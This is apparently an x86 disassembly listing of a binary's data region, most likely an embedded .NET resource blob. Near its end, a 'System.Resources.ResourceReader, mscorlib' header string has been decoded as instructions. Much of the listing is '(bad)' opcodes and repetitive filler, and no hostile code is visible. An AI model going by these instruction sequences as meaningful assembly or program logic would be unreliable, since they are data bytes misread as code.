  45001c:	pop    ss
  45001d:	inc    esi
  45001e:	jmp    FWORD PTR [edi]
  450020:	sub    DWORD PTR [ecx-0x1],eax
  450023:	inc    esp
  450024:	cmp    al,0x66
  450026:	inc    DWORD PTR [edx+0x4f]
  450029:	xlat   BYTE PTR ds:[ebx]
  45002a:	inc    DWORD PTR [eax]
  45002c:	add    bh,bh
  45002e:	inc    DWORD PTR [esp+eax*1]
  450031:	add    bh,bh
  450033:	add    BYTE PTR [eax],al
  450035:	add    bh,bh
  450037:	add    BYTE PTR [eax],al
  450039:	add    bh,bh
  45003b:	add    BYTE PTR [eax],al
  45003d:	add    bh,bh
  45003f:	add    BYTE PTR [eax],al
  450041:	add    bh,bh
  450043:	add    BYTE PTR [eax],al
  450045:	add    bh,bh
  450047:	add    BYTE PTR [eax],al
  450049:	add    bh,bh
  45004b:	add    eax,DWORD PTR [ebx]
  45004d:	add    bh,bh
  45004f:	add    BYTE PTR [ecx],dh
  450051:	(bad)  
  450052:	inc    DWORD PTR [eax]
  450054:	ss (bad) 
  450056:	inc    DWORD PTR [eax]
  450058:	aaa    
  450059:	(bad)  
  45005a:	inc    DWORD PTR [eax]
  45005c:	inc    eax
  45005d:	(bad)  
  45005e:	inc    DWORD PTR [eax]
  450060:	inc    eax
  450061:	(bad)  
  450062:	inc    DWORD PTR [eax]
  450064:	inc    ebx
  450065:	(bad)  
  450066:	inc    DWORD PTR [eax]
  450068:	inc    esi
  450069:	(bad)  
  45006a:	inc    DWORD PTR [eax]
  45006c:	dec    ebx
  45006d:	(bad)  
  45006e:	inc    DWORD PTR [eax]
  450070:	dec    edi
  450071:	(bad)  
  450072:	jmp    FWORD PTR [esi]
  450074:	jo     0x450075
  450076:	inc    DWORD PTR [ecx]
  450078:	push   es
  450079:	sbb    edi,edi
  45007b:	add    DWORD PTR [ecx],eax
  45007d:	add    edi,edi
  45007f:	add    eax,0xff0005
  450084:	add    bh,bh
  450086:	inc    DWORD PTR [eax]
  450088:	add    bh,bh
  45008a:	inc    DWORD PTR [eax]
  45008c:	add    bh,bh
  45008e:	inc    DWORD PTR [eax]
  450090:	add    bh,bh
  450092:	inc    DWORD PTR [eax]
  450094:	add    bh,bh
  450096:	inc    DWORD PTR [eax]
  450098:	add    bh,bh
  45009a:	inc    DWORD PTR [eax]
  45009c:	add    bh,bh
  45009e:	inc    DWORD PTR [eax]
  4500a0:	add    bh,bh
  4500a2:	inc    DWORD PTR [eax]
  4500a4:	add    bh,bh
  4500a6:	inc    DWORD PTR [eax]
  4500a8:	add    bh,bh
  4500aa:	inc    DWORD PTR [ebx+eax*1]
  4500ad:	add    bh,bh
  4500af:	add    BYTE PTR [eax],al
  4500b1:	add    bh,bh
  4500b3:	add    BYTE PTR [eax],al
  4500b5:	add    bh,bh
  4500b7:	add    BYTE PTR [eax],al
  4500b9:	add    bh,bh
  4500bb:	add    BYTE PTR [eax],al
  4500bd:	add    bh,bh
  4500bf:	add    BYTE PTR [eax],al
  4500c1:	add    bh,bh
  4500c3:	add    BYTE PTR [eax],al
  4500c5:	add    bh,bh
  4500c7:	add    BYTE PTR [eax],al
  4500c9:	add    bh,bh
  4500cb:	add    BYTE PTR [eax],al
  4500cd:	add    bh,bh
  4500cf:	add    eax,DWORD PTR [ebx]
  4500d1:	add    bh,bh
  4500d3:	add    eax,DWORD PTR [ebx]
  4500d5:	add    bh,bh
  4500d7:	add    eax,DWORD PTR [ebx]
  4500d9:	add    bh,bh
  4500db:	add    al,0x4
  4500dd:	add    bh,bh
  4500df:	add    eax,0x5ff0004
  4500e4:	add    eax,0x405ff00
  4500e9:	add    bh,bh
  4500eb:	add    eax,0x7ff0005
  4500f0:	add    eax,0x507ff00
  4500f5:	add    bh,bh
  4500f7:	add    al,0x4
  4500f9:	add    bh,bh
  4500fb:	add    BYTE PTR [eax],al
  4500fd:	add    bh,bh
  4500ff:	push   es
  450100:	add    eax,0x505ff00
  450105:	add    bh,bh
  450107:	pop    es
  450108:	add    eax,0x506ff00
  45010d:	add    bh,bh
  45010f:	pop    es
  450110:	add    eax,0x507ff00
  450115:	add    bh,bh
  450117:	pop    es
  450118:	add    eax,0x405ff00
  45011d:	add    bh,bh
  45011f:	add    al,0x4
  450121:	add    bh,bh
  450123:	add    al,0x3
  450125:	add    bh,bh
  450127:	add    eax,DWORD PTR [ebx]
  450129:	add    bh,bh
  45012b:	add    BYTE PTR [eax],al
  45012d:	add    bh,bh
  45012f:	add    BYTE PTR [eax],al
  450131:	add    bh,bh
  450133:	add    BYTE PTR [eax],al
  450135:	add    bh,bh
  450137:	add    BYTE PTR [eax],al
  450139:	add    bh,bh
  45013b:	add    BYTE PTR [eax],al
  45013d:	add    bh,bh
  45013f:	add    BYTE PTR [eax],al
  450141:	add    bh,bh
  450143:	add    BYTE PTR [eax],al
  450145:	add    bh,bh
  450147:	add    BYTE PTR [eax],al
  450149:	add    bh,bh
  45014b:	add    BYTE PTR [eax],al
  45014d:	add    bh,bh
  45014f:	add    BYTE PTR [eax],al
  450151:	add    bh,bh
  450153:	add    BYTE PTR [eax],al
  450155:	add    bh,bh
  450157:	add    BYTE PTR [eax],al
  450159:	add    bh,bh
  45015b:	add    BYTE PTR [eax],al
  45015d:	add    bh,bh
  45015f:	add    BYTE PTR [eax],al
  450161:	add    bh,bh
  450163:	add    BYTE PTR [eax],al
  450165:	add    bh,bh
  450167:	add    BYTE PTR [eax],al
  450169:	add    bh,bh
  45016b:	add    BYTE PTR [eax],al
  45016d:	add    bh,bh
  45016f:	add    BYTE PTR [eax],al
  450171:	add    bh,bh
  450173:	add    BYTE PTR [eax],al
  450175:	add    bh,bh
  450177:	add    BYTE PTR [eax],al
  450179:	add    bh,bh
  45017b:	add    BYTE PTR [eax],al
  45017d:	add    bh,bh
  45017f:	add    BYTE PTR [eax],al
  450181:	add    bh,bh
  450183:	add    BYTE PTR [eax],al
  450185:	add    bh,bh
  450187:	add    BYTE PTR [eax],al
  450189:	add    bh,bh
  45018b:	add    BYTE PTR [eax],al
  45018d:	add    bh,bh
  45018f:	add    BYTE PTR [eax],al
  450191:	add    bh,bh
  450193:	add    BYTE PTR [eax],al
  450195:	add    bh,bh
  450197:	add    BYTE PTR [eax],al
  450199:	add    bh,bh
  45019b:	add    BYTE PTR [eax],al
  45019d:	add    bh,bh
  45019f:	add    DWORD PTR [ecx],eax
  4501a1:	add    edi,edi
  4501a3:	add    BYTE PTR [eax],al
  4501a5:	add    bh,bh
  4501a7:	add    BYTE PTR [eax],al
  4501a9:	add    bh,bh
  4501ab:	add    BYTE PTR [eax],al
  4501ad:	add    bh,bh
  4501af:	add    BYTE PTR [eax],al
  4501b1:	add    bh,bh
  4501b3:	add    BYTE PTR [eax],al
  4501b5:	add    bh,bh
  4501b7:	add    BYTE PTR [eax],al
  4501b9:	add    bh,bh
  4501bb:	add    BYTE PTR [eax],al
  4501bd:	add    bh,bh
  4501bf:	or     cl,BYTE PTR [ecx]
  4501c1:	or     dl,bh
  4501c3:	add    BYTE PTR [eax],al
  4501c5:	add    bh,bh
  4501c7:	add    BYTE PTR [eax],al
  4501c9:	add    bh,bh
  4501cb:	add    BYTE PTR [eax],al
  4501cd:	add    bh,bh
  4501cf:	add    BYTE PTR [eax],al
  4501d1:	add    bh,bh
  4501d3:	add    BYTE PTR [eax],al
  4501d5:	add    bh,bh
  4501d7:	add    BYTE PTR [eax],al
  4501d9:	add    bh,bh
  4501db:	add    BYTE PTR [eax],al
  4501dd:	add    bh,bh
  4501df:	add    BYTE PTR [eax],al
  4501e1:	add    bh,bh
  4501e3:	add    BYTE PTR [eax],al
  4501e5:	add    bh,bh
  4501e7:	add    BYTE PTR [eax],al
  4501e9:	add    bh,bh
  4501eb:	add    BYTE PTR [eax],al
  4501ed:	add    bh,bh
  4501ef:	add    BYTE PTR [eax],al
  4501f1:	add    bh,bh
  4501f3:	add    BYTE PTR [eax],al
  4501f5:	add    bh,bh
  4501f7:	add    BYTE PTR [eax],al
  4501f9:	add    bh,bh
  4501fb:	add    BYTE PTR [eax],al
  4501fd:	add    bh,bh
  4501ff:	add    BYTE PTR [eax],al
  450201:	add    bh,bh
  450203:	add    BYTE PTR [eax],al
  450205:	add    bh,bh
  450207:	add    BYTE PTR [eax],al
  450209:	add    bh,bh
  45020b:	add    BYTE PTR [eax],al
  45020d:	add    bh,bh
  45020f:	add    BYTE PTR [eax],al
  450211:	add    bh,bh
  450213:	add    BYTE PTR [eax],al
  450215:	add    bh,bh
  450217:	add    BYTE PTR [eax],al
  450219:	add    bh,bh
  45021b:	add    BYTE PTR [eax],al
  45021d:	add    bh,bh
  45021f:	add    BYTE PTR [eax],al
  450221:	add    bh,bh
  450223:	add    BYTE PTR [eax],al
  450225:	add    bh,bh
  450227:	add    BYTE PTR [eax],al
  450229:	add    bh,bh
  45022b:	add    BYTE PTR [eax],al
  45022d:	add    bh,bh
  45022f:	add    BYTE PTR [eax],al
  450231:	add    bh,bh
  450233:	add    BYTE PTR [eax],al
  450235:	add    bh,bh
  450237:	add    BYTE PTR [eax],al
  450239:	add    bh,bh
  45023b:	add    BYTE PTR [eax],al
  45023d:	add    bh,bh
  45023f:	add    BYTE PTR [eax],al
  450241:	adc    DWORD PTR [eax+eax*1+0xff0000],edi
  450248:	add    BYTE PTR [eax],al
  45024a:	inc    DWORD PTR [eax]
  45024c:	add    BYTE PTR [eax],al
  45024e:	inc    DWORD PTR [eax]
  450250:	add    BYTE PTR [eax],al
  450252:	inc    DWORD PTR [eax]
  450254:	add    BYTE PTR [eax],al
  450256:	inc    DWORD PTR [eax]
  450258:	add    BYTE PTR [eax],al
  45025a:	inc    DWORD PTR [eax]
  45025c:	add    BYTE PTR [eax],al
  45025e:	inc    DWORD PTR [eax]
  450260:	add    BYTE PTR [eax],al
  450262:	inc    DWORD PTR [eax]
  450264:	add    BYTE PTR [eax],al
  450266:	inc    DWORD PTR [eax]
  450268:	add    BYTE PTR [eax],al
  45026a:	inc    DWORD PTR [eax]
  45026c:	add    BYTE PTR [eax],al
  45026e:	inc    DWORD PTR [eax]
  450270:	add    BYTE PTR [eax],al
  450272:	inc    DWORD PTR [eax]
  450274:	add    BYTE PTR [eax],al
  450276:	inc    DWORD PTR [eax]
  450278:	add    BYTE PTR [eax],al
  45027a:	inc    DWORD PTR [eax]
  45027c:	add    BYTE PTR [eax],al
  45027e:	inc    DWORD PTR [eax]
  450280:	add    BYTE PTR [eax],al
  450282:	inc    DWORD PTR [eax]
  450284:	add    BYTE PTR [eax],al
  450286:	inc    DWORD PTR [eax]
  450288:	add    BYTE PTR [eax],al
  45028a:	inc    DWORD PTR [eax]
  45028c:	add    BYTE PTR [eax],al
  45028e:	inc    DWORD PTR [eax]
  450290:	add    BYTE PTR [eax],al
  450292:	inc    DWORD PTR [eax]
  450294:	add    BYTE PTR [eax],al
  450296:	inc    DWORD PTR [eax]
  450298:	add    BYTE PTR [eax],al
  45029a:	inc    DWORD PTR [eax]
  45029c:	add    BYTE PTR [eax],al
  45029e:	inc    DWORD PTR [eax]
  4502a0:	add    BYTE PTR [eax],al
  4502a2:	inc    DWORD PTR [eax]
  4502a4:	add    BYTE PTR [eax],al
  4502a6:	inc    DWORD PTR [eax]
  4502a8:	add    BYTE PTR [eax],al
  4502aa:	inc    DWORD PTR [eax]
  4502ac:	add    BYTE PTR [eax],al
  4502ae:	inc    DWORD PTR [eax]
  4502b0:	add    BYTE PTR [eax],al
  4502b2:	inc    DWORD PTR [eax]
  4502b4:	add    BYTE PTR [eax],al
  4502b6:	inc    DWORD PTR [eax]
  4502b8:	add    BYTE PTR [eax],al
  4502ba:	inc    DWORD PTR [eax]
  4502bc:	add    BYTE PTR [ecx],dl
  4502be:	fild   DWORD PTR [eax]
  4502c0:	add    BYTE PTR [ecx],dl
  4502c2:	sub    al,0x0
  4502c4:	add    BYTE PTR [edx],dl
  4502c6:	mov    bh,0x0
  4502c8:	add    BYTE PTR [edx],dl
  4502ca:	stc    
  4502cb:	add    BYTE PTR [eax],al
  4502cd:	add    bh,bh
  4502cf:	add    BYTE PTR [eax],al
  4502d1:	add    bh,bh
  4502d3:	add    BYTE PTR [eax],al
  4502d5:	add    bh,bh
  4502d7:	add    BYTE PTR [eax],al
  4502d9:	add    bh,bh
  4502db:	add    BYTE PTR [eax],al
  4502dd:	add    bh,bh
  4502df:	add    BYTE PTR [eax],al
  4502e1:	add    bh,bh
  4502e3:	add    BYTE PTR [eax],al
  4502e5:	add    bh,bh
  4502e7:	add    BYTE PTR [eax],al
  4502e9:	add    bh,bh
  4502eb:	add    BYTE PTR [eax],al
  4502ed:	add    bh,bh
  4502ef:	add    BYTE PTR [eax],al
  4502f1:	add    bh,bh
  4502f3:	add    BYTE PTR [eax],al
  4502f5:	add    bh,bh
  4502f7:	add    BYTE PTR [eax],al
  4502f9:	add    bh,bh
  4502fb:	add    BYTE PTR [eax],al
  4502fd:	add    bh,bh
  4502ff:	add    BYTE PTR [eax],al
  450301:	add    bh,bh
  450303:	add    BYTE PTR [eax],al
  450305:	add    bh,bh
  450307:	add    BYTE PTR [eax],al
  450309:	add    bh,bh
  45030b:	add    BYTE PTR [eax],al
  45030d:	add    bh,bh
  45030f:	add    BYTE PTR [eax],al
  450311:	add    bh,bh
  450313:	add    BYTE PTR [eax],al
  450315:	add    bh,bh
  450317:	add    BYTE PTR [eax],al
  450319:	add    bh,bh
  45031b:	add    BYTE PTR [eax],al
  45031d:	add    bh,bh
  45031f:	add    BYTE PTR [eax],al
  450321:	add    bh,bh
  450323:	add    BYTE PTR [eax],al
  450325:	add    bh,bh
  450327:	add    BYTE PTR [eax],al
  450329:	add    bh,bh
  45032b:	add    BYTE PTR [eax],al
  45032d:	add    bh,bh
  45032f:	add    BYTE PTR [eax],al
  450331:	add    bh,bh
  450333:	or     al,0xa
  450335:	or     bh,bl
  450337:	add    BYTE PTR [eax],al
  450339:	adc    dl,dl
  45033b:	add    BYTE PTR [eax],al
  45033d:	adc    dh,BYTE PTR [edi]
	...
  4503bf:	sub    BYTE PTR [eax],al
  4503c1:	add    BYTE PTR [eax],al
  4503c3:	adc    BYTE PTR [eax],al
  4503c5:	add    BYTE PTR [eax],al
  4503c7:	and    BYTE PTR [eax],al
  4503c9:	add    BYTE PTR [eax],al
  4503cb:	add    DWORD PTR [eax],eax
  4503cd:	and    BYTE PTR [eax],al
  4503cf:	add    BYTE PTR [eax],al
  4503d1:	add    BYTE PTR [eax],al
  4503d3:	inc    eax
  4503d4:	add    al,0x0
	...
  45046e:	add    BYTE PTR [esi],al
  450470:	add    al,0x6
  450472:	repz add al,0x4
  450475:	add    al,0xf5
  450477:	add    DWORD PTR [ecx],eax
  450479:	add    esp,esi
  45047b:	add    al,0x4
  45047d:	add    al,0xf4
  45047f:	add    DWORD PTR [ecx],eax
  450481:	add    esi,esp
  450483:	or     BYTE PTR [eax],cl
  450485:	pop    es
  450486:	mov    ah,0x3
  450488:	add    eax,DWORD PTR [ebx]
  45048a:	fadd   QWORD PTR [ecx]
  45048c:	add    eax,DWORD PTR [ebx]
  45048e:	hlt    
  45048f:	add    eax,DWORD PTR [ecx]
  450491:	add    esi,esp
  450493:	push   es
  450494:	push   es
  450495:	pop    es
  450496:	hlt    
  450497:	pop    es
  450498:	pop    es
  450499:	pop    es
  45049a:	hlt    
  45049b:	add    eax,DWORD PTR [ebx]
  45049d:	push   es
  45049e:	hlt    
	...
  4504a7:	stos   BYTE PTR es:[edi],al
  4504a8:	push   ebp
  4504a9:	push   ebp
  4504aa:	add    eax,DWORD PTR [esp+eax*1]
  4504ad:	add    eax,0xfff8c1e2
  4504b2:	(bad)  
  4504b3:	mov    ebp,0xc1fff0e8
  4504b8:	clc    
  4504b9:	(bad)  
  4504ba:	(bad)  
  4504bb:	mov    eax,0xc1fff2ec
  4504c0:	clc    
  4504c1:	(bad)  
  4504c2:	inc    DWORD PTR [esi]
  4504c4:	push   es
  4504c5:	pop    es
  4504c6:	stc    
  4504c7:	push   es
  4504c8:	push   es
  4504c9:	pop    es
  4504ca:	cld    
  4504cb:	sar    eax,0xff
  4504ce:	inc    ecx
  4504d0:	clc    
  4504d1:	(bad)  
  4504d2:	inc    ecx
  4504d4:	clc    
  4504d5:	(bad)  
  4504d6:	inc    edi
  4504d8:	icebp  
  4504d9:	idiv   bh
  4504db:	sar    eax,0xff
  4504de:	inc    DWORD PTR [esi]
  4504e0:	push   es
  4504e1:	or     ch,ah
  4504e3:	add    BYTE PTR [eax],al
  4504e5:	add    BYTE PTR [eax],al
  4504e7:	adc    eax,0xc1fd1816
  4504ec:	clc    
  4504ed:	(bad)  
  4504ee:	jmp    DWORD PTR [edx-0x47]
  4504f1:	loop   0x4504f2
  4504f3:	cmp    eax,0x2effd093
  4504f8:	push   ecx
  4504f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4504fa:	call   DWORD PTR [esi-0x4d]
  4504fd:	loopne 0x4504fe
  4504ff:	sar    eax,0xff
  450502:	inc    DWORD PTR [ebx]
  450504:	add    eax,DWORD PTR ds:0xe8
  45050a:	add    ebx,DWORD PTR [ecx-0x47]
  45050d:	ret    
  45050e:	inc    DWORD PTR [edx-0x59]
  450511:	fdiv   st(7),st
  450513:	and    ch,BYTE PTR [ecx-0x4b]
  450516:	dec    DWORD PTR [ebp-0x5c]
  450519:	aam    0xff
  45051b:	je     0x4504d7
  45051d:	in     al,0xff
  45051f:	sar    eax,0xff
  450522:	inc    DWORD PTR ds:0xc1e00c09
  450528:	clc    
  450529:	(bad)  
  45052a:	jmp    FWORD PTR [eax-0x48]
  45052d:	loop   0x45052e
  45052f:	and    cl,BYTE PTR [ecx+0xc09ffd3]
  450535:	adc    edi,esi
  450537:	pop    es
  450538:	pop    es
  450539:	or     al,0xfb
  45053b:	adc    BYTE PTR [esi],dh
  45053d:	pusha  
  45053e:	call   FWORD PTR [esp+eiz*2]
  450541:	mov    eax,ds:0x10101ff
  450546:	jmp    0x250c:0x0
  45054d:	pusha  
  45054e:	call   DWORD PTR ds:0x1ff8532
  450554:	add    DWORD PTR [ebx],eax
  450556:	out    dx,eax
  450557:	or     dl,BYTE PTR [ecx]
  450559:	push   ss
  45055a:	mul    DWORD PTR [esi]
  45055c:	mov    esp,edx
  45055e:	inc    DWORD PTR [esi-0x68]
  450561:	loopne 0x450562
  450563:	dec    edx
  450564:	jae    0x450515
  450566:	call   DWORD PTR [ebx]
  450568:	and    dl,BYTE PTR [edi+edi*8+0x10]
  45056c:	cmp    eax,0xc06ff9b
  450571:	sbb    al,0xff
  450573:	adc    edx,DWORD PTR [ebx]
  450575:	adc    eax,DWORD PTR [edx+0x37]
  450578:	sub    al,0x16
  45057a:	pop    ss
  45057b:	pop    es
  45057c:	adc    BYTE PTR [ebp-0x1],cl
  45057f:	or     dh,BYTE PTR [eax]
  450581:	xchg   ebx,eax
  450582:	inc    DWORD PTR [ebx]
  450584:	add    eax,DWORD PTR [esi]
  450586:	repz add BYTE PTR [eax],al
  450589:	add    BYTE PTR [eax],al
  45058b:	add    BYTE PTR [ecx],al
  45058d:	push   edx
  45058e:	dec    DWORD PTR ds:0x3ff9229
  450594:	add    eax,0x8105
  450599:	add    BYTE PTR [eax],al
  45059b:	push   es
  45059c:	adc    BYTE PTR [ebx-0x1],al
  45059f:	(bad)  
  4505a1:	xchg   ecx,eax
  4505a2:	dec    DWORD PTR [edi]
  4505a4:	sbb    eax,0x300ff5d
  4505a9:	dec    ecx
  4505aa:	dec    DWORD PTR [edx]
  4505ac:	and    BYTE PTR [ebx+0x200a09ff],ah
  4505b2:	call   DWORD PTR [esp+edx*1]
  4505b5:	adc    DWORD PTR [edx+0x9],ecx
  4505b8:	or     al,0x73
  4505ba:	dec    DWORD PTR [edx]
  4505bc:	adc    BYTE PTR [edi+edi*8-0x42e3e7],ah
  4505c3:	add    DWORD PTR [ecx],eax
  4505c5:	add    edi,ecx
  4505c7:	add    BYTE PTR [eax],al
  4505c9:	add    BYTE PTR [eax],al
  4505cb:	add    BYTE PTR [ebx],al
  4505cd:	xor    edi,edi
  4505cf:	pop    es
  4505d0:	sbb    eax,0x303ff87
  4505d5:	add    eax,DWORD PTR [eax+eax*1+0x3000000]
  4505dc:	add    al,0x18
  4505de:	call   DWORD PTR [eax]
  4505e0:	sbb    DWORD PTR [ebx+0x4a0a07ff],ecx
  4505e6:	inc    DWORD PTR [ebx]
  4505e8:	push   es
  4505e9:	inc    edi
  4505ea:	call   FWORD PTR [ecx]
  4505ec:	aas    
  4505ed:	sahf   
  4505ee:	inc    DWORD PTR [ebx]
  4505f0:	add    ecx,DWORD PTR ds:0x50505ff
  4505f6:	pop    edx
  4505f7:	add    al,0x4
  4505f9:	pop    es
  4505fa:	jmp    0x4505fd
  4505fc:	add    DWORD PTR [ebx],eax
  4505fe:	jmp    0xf54f0906
  450603:	or     DWORD PTR [ecx],ecx
  450605:	or     DWORD PTR [ebx+edx*1+0x1a0913],eax
  45060c:	add    esi,DWORD PTR [edx]
  45060e:	dec    DWORD PTR [edx]
  450610:	adc    BYTE PTR [edi+edi*8+0x3],dl
  450614:	add    eax,DWORD PTR [eax]
  450616:	add    DWORD PTR [eax],0x0
  450619:	add    BYTE PTR [eax],al
  45061b:	push   es
  45061c:	push   es
  45061d:	adc    bh,bh
  45061f:	or     al,0xf
  450621:	jb     0x450622
  450623:	add    al,0x6
  450625:	popa   
  450626:	inc    DWORD PTR [esi]
  450628:	push   es
  450629:	inc    ebx
  45062a:	call   FWORD PTR [ecx]
  45062c:	pop    ds
  45062d:	ins    BYTE PTR es:[edi],dx
  45062e:	inc    DWORD PTR [ecx]
  450630:	add    esp,DWORD PTR [edx]
  450632:	inc    DWORD PTR [ecx]
  450634:	add    DWORD PTR [ebx],eax
  450636:	out    dx,al
  450637:	and    al,0x12
  450639:	adc    cl,BYTE PTR [esi]
  45063b:	add    BYTE PTR [eax],al
  45063d:	add    BYTE PTR [ebx+eax*1],ch
  450640:	add    ecx,DWORD PTR [edx]
  450642:	jecxz  0x450649
  450644:	add    eax,0x27278405
  450649:	daa    
  45064a:	sbb    al,BYTE PTR [eax]
  45064c:	add    BYTE PTR [eax],bl
  45064e:	dec    DWORD PTR [ecx]
  450650:	or     al,0x36
  450652:	inc    DWORD PTR [ebx]
  450654:	add    eax,DWORD PTR [ebx*8-0x6bfefeff]
  45065b:	pop    es
  45065c:	or     bh,BYTE PTR [edi]
  45065e:	call   DWORD PTR ds:0x19ff7918
  450664:	sbb    al,0xbd
  450666:	inc    DWORD PTR [ecx]
  450668:	add    esp,DWORD PTR ds:0x85120cff
  45066e:	inc    DWORD PTR [ecx]
  450670:	add    ebx,DWORD PTR [edi+edi*8+0x3]
  450674:	add    DWORD PTR [ebx],edx
  450676:	inc    DWORD PTR [ecx]
  450678:	add    DWORD PTR [edi+edi*8],ecx
  45067b:	add    eax,DWORD PTR [eax+ebx*1]
  45067e:	inc    DWORD PTR [ecx]
  450680:	push   es
  450681:	pusha  
  450682:	inc    DWORD PTR [ebx]
  450684:	add    eax,DWORD PTR [esi]
  450686:	sti    
  450687:	add    BYTE PTR [eax],al
  450689:	add    BYTE PTR [eax],al
  45068b:	add    BYTE PTR [eax],al
  45068d:	dec    ebx
  45068e:	inc    DWORD PTR [edi]
  450690:	or     DWORD PTR [edx-0x1],esp
  450693:	add    eax,DWORD PTR [ebx]
  450695:	xor    bh,bh
  450697:	push   es
  450698:	pop    es
  450699:	das    
  45069a:	dec    DWORD PTR [edi]
  45069c:	adc    esp,DWORD PTR [eax-0x1]
  45069f:	pop    es
  4506a0:	or     bl,BYTE PTR [edx+0x340303ff]
  4506a6:	sti    
  4506a7:	add    DWORD PTR [ecx],eax
  4506a9:	add    al,0xe2
  4506ab:	add    edx,DWORD PTR [edx]
  4506ad:	xchg   ebp,eax
  4506ae:	dec    DWORD PTR [ebx+edx*1]
  4506b1:	xchg   esi,eax
  4506b2:	call   DWORD PTR [esi]
  4506b4:	adc    eax,0x1913ff65
  4506b9:	cmp    edi,0xff851307
  4506bf:	add    BYTE PTR [edx],cl
  4506c1:	mov    edi,?
  4506c3:	add    al,0x4
  4506c5:	or     edx,edi
  4506c7:	or     cl,BYTE PTR [eax]
  4506c9:	or     dl,BYTE PTR [ebp-0x7dff00]
  4506cf:	pop    es
  4506d0:	pop    es
  4506d1:	xchg   esp,eax
  4506d2:	inc    DWORD PTR [esi]
  4506d4:	or     ch,BYTE PTR [eax-0x1]
  4506d7:	adc    eax,0x13ff6f15
  4506dc:	adc    eax,0x303ff9a
  4506e1:	xor    al,0xfb
  4506e3:	add    BYTE PTR [eax],al
  4506e5:	add    BYTE PTR [edx],dl
  4506e7:	add    BYTE PTR [eax],al
  4506e9:	add    BYTE PTR [eax],al
  4506eb:	add    DWORD PTR [ecx],eax
  4506ed:	add    esp,ecx
  4506ef:	or     DWORD PTR [edx],ecx
  4506f1:	push   eax
  4506f2:	inc    DWORD PTR [esi]
  4506f4:	sbb    BYTE PTR [edi+edi*8+0x18],bh
  4506f8:	sbb    al,0xbd
  4506fa:	call   FWORD PTR [ecx]
  4506fc:	sbb    al,0xbd
  4506fe:	call   FWORD PTR [ecx]
  450700:	sbb    al,0xbd
  450702:	dec    DWORD PTR [edx]
  450704:	or     dl,BYTE PTR [eax]
  450706:	sti    
  450707:	sbb    DWORD PTR ds:0x1c19fe5c,edx
  45070d:	mov    ebp,0x9a1513ff
  450712:	call   DWORD PTR [ebx]
  450714:	adc    eax,0xa09ff9a
  450719:	push   eax
  45071a:	inc    DWORD PTR [ebx]
  45071c:	add    esi,DWORD PTR [ebx]
  45071e:	sti    
  45071f:	add    BYTE PTR [eax],al
  450721:	add    BYTE PTR [edx],dl
	...
  45072f:	add    DWORD PTR [ecx],eax
  450731:	add    al,0xbd
  450733:	push   es
  450734:	push   es
  450735:	push   es
  450736:	mov    BYTE PTR [esi],0x6
  450739:	push   es
  45073a:	ror    DWORD PTR [eax],1
  45073c:	or     BYTE PTR [eax],cl
  45073e:	rol    DWORD PTR [esp+eax*1],1
  450741:	add    al,0xe3
  450743:	adc    eax,0x68e1515
  450748:	push   es
  450749:	push   es
  45074a:	rol    BYTE PTR [esi],1
  45074c:	push   es
  45074d:	push   es
  45074e:	rol    BYTE PTR [esi],1
  450750:	push   es
  450751:	push   es
  450752:	rol    BYTE PTR [esi],1
  450754:	push   es
  450755:	push   es
  450756:	enter  0x101,0x1
  45075a:	mov    edi,0x46000000
	...
  4507e7:	(bad)  
  4507e8:	inc    DWORD PTR [eax]
  4507ea:	add    bh,bh
  4507ec:	inc    DWORD PTR [eax]
  4507ee:	add    al,al
  4507f0:	add    eax,DWORD PTR [eax]
  4507f2:	add    BYTE PTR [eax],al
  4507f4:	add    DWORD PTR [eax],eax
  4507f6:	add    BYTE PTR [eax],al
  4507f8:	add    BYTE PTR [eax],al
  4507fa:	add    BYTE PTR [eax],al
  4507fc:	add    BYTE PTR [eax],0x0
  4507ff:	add    BYTE PTR [eax-0x78000000],cl
  450805:	add    BYTE PTR [eax],al
  450807:	add    BYTE PTR [eax],cl
  450809:	add    BYTE PTR [eax],al
  45080b:	add    BYTE PTR [eax],al
  45080d:	add    BYTE PTR [eax],al
  45080f:	add    BYTE PTR [eax+0x0],al
  450815:	add    BYTE PTR [eax],al
  450817:	add    BYTE PTR [ecx],0x0
  45081a:	add    al,al
  45081c:	add    eax,DWORD PTR [eax]
  45081e:	add    bh,bh
  450820:	inc    DWORD PTR [eax]
  450822:	add    bh,bh
  450824:	inc    DWORD PTR [eax]
  450826:	add    BYTE PTR [ebx],cl
  450828:	add    BYTE PTR [eax],al
  45082a:	add    BYTE PTR [eax],al
  45082c:	mov    ah,0x0
  45082e:	add    BYTE PTR [eax],al
  450830:	into   
  450831:	retf   0xbeef
  450834:	add    DWORD PTR [eax],eax
  450836:	add    BYTE PTR [eax],al
  450838:	xchg   ecx,eax
  450839:	add    BYTE PTR [eax],al
  45083b:	add    BYTE PTR [ebx+edx*2+0x79],ch
  45083f:	jae    0x4508b5
  450841:	gs ins DWORD PTR es:[edi],dx
  450843:	cs push edx
  450845:	gs jae 0x4508b7
  450848:	jne    0x4508bc
  45084a:	arpl   WORD PTR [ebp+0x73],sp
  45084d:	cs push edx
  45084f:	gs jae 0x4508c1
  450852:	jne    0x4508c6
  450854:	arpl   WORD PTR [ebp+0x52],sp
  450857:	gs popa 
  450859:	fs gs jb 0x450889
  45085d:	and    BYTE PTR [ebp+0x73],ch
  450860:	arpl   WORD PTR [edi+0x72],bp
  450863:	ins    BYTE PTR es:[edi],dx
  450864:	imul   esp,DWORD PTR [edx+0x2c],0x72655620
  45086b:	jae    0x4508d6
  45086d:	outs   dx,DWORD PTR ds:[esi]
  45086e:	outs   dx,BYTE PTR ds:[esi]
  45086f:	cmp    eax,0x2e302e34
  450874:	xor    BYTE PTR [esi],ch
  450876:	xor    BYTE PTR [eax+eiz*1],ch
  450879:	inc    ebx
  45087a:	jne    0x4508e8
  45087c:	je     0x4508f3
  45087e:	jb     0x4508e5
  450880:	cmp    eax,0x7475656e
  450885:	jb     0x4508e8
  450887:	ins    BYTE PTR es:[edi],dx
  450888:	sub    al,0x20
  45088a:	push   eax
  45088b:	jne    0x4508ef
  45088d:	ins    BYTE PTR es:[edi],dx
  45088e:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  450895:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  450899:	bound  esi,QWORD PTR [edi]
  45089b:	aaa    
  45089c:	popa   
  45089d:	xor    eax,0x31363563
  4508a2:	cmp    DWORD PTR [ebx],esi
  4508a4:	xor    al,0x65
  4508a6:	xor    BYTE PTR [eax],bh
  4508a8:	cmp    DWORD PTR [ebx],esp
  4508aa:	push   ebx
